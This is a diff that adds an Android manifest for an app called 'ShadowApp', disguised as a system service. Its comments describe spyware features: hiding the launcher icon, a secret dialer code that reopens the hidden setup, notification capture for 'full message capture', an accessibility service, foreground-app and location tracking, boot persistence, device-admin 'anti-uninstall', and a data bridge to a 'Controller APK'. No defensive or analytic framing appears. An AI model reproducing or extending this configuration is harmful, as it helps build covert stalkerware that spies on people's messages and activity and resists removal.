@@ -1,0 +1,157 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools">
+
+    <!-- ── Network & Internet ── -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+
+    <!-- ── Background Execution ── -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+
+    <!-- ── Storage ── -->
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
+        android:maxSdkVersion="32" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"
+        android:maxSdkVersion="29" />
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+
+    <!-- ── Notifications ── -->
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
+        tools:ignore="ProtectedPermissions" />
+
+    <!-- ── Location (for WiFi SSID on Android 8.1+) ── -->
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+
+    <!-- ── Usage Stats (foreground app detection) ── -->
+    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"
+        tools:ignore="ProtectedPermissions" />
+
+    <!-- ── System Alert (overlay) ── -->
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+
+    <!-- ── Call Log & Phone State (for dialer secret code) ── -->
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+
+    <!-- ── Signature Permission (only apps signed with same key can access) ── -->
+    <permission
+        android:name="com.system.service.PROVIDER_ACCESS"
+        android:protectionLevel="signature" />
+
+    <application
+        android:name=".ShadowApp"
+        android:allowBackup="false"
+        android:icon="@mipmap/ic_launcher"
+        android:label="@string/app_name"
+        android:supportsRtl="true"
+        android:theme="@style/Theme.SystemService"
+        tools:targetApi="35">
+
+        <!-- ── Setup Activity (main entry, always enabled) ── -->
+        <activity
+            android:name=".SetupActivity"
+            android:exported="true"
+            android:theme="@style/Theme.SystemService"
+            android:launchMode="singleTask" />
+
+        <!-- ── Launcher Alias (disabled to hide from launcher, re-enabled to show) ── -->
+        <activity-alias
+            android:name=".SetupLauncher"
+            android:targetActivity=".SetupActivity"
+            android:exported="true"
+            android:enabled="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <!-- ── ContentProvider (data bridge to Controller APK) ── -->
+        <provider
+            android:name=".providers.DataProvider"
+            android:authorities="com.system.service.provider"
+            android:exported="true"
+            android:permission="com.system.service.PROVIDER_ACCESS" />
+
+        <!-- Core Monitor is now a background singleton (MonitorCore) -->
+        <service
+            android:name=".services.InputAccessibilityService"
+            android:exported="true"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_config" />
+        </service>
+
+        <!-- ── Notification Listener (full message capture) ── -->
+        <service
+            android:name=".services.NotifListenerService"
+            android:exported="true"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
+
+        <!-- ── Secret Dialer Code Receiver ── -->
+        <!-- Dial *#*#27420#*#* to re-open hidden setup -->
+        <receiver
+            android:name=".receivers.SecretCodeReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SECRET_CODE" />
+                <data android:scheme="android_secret_code" android:host="27420" />
+            </intent-filter>
+        </receiver>
+
+        <!-- ── Boot Receiver (Persistence) ── -->
+        <receiver
+            android:name=".receivers.BootReceiver"
+            android:directBootAware="true"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- ── Package Update Receiver ── -->
+        <receiver
+            android:name=".receivers.UpdateReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- ── Device Admin (anti-uninstall) ── -->
+        <receiver
+            android:name=".receivers.DeviceAdminReceiver"
+            android:exported="true"
+            android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
+
+    </application>
+
+</manifest>
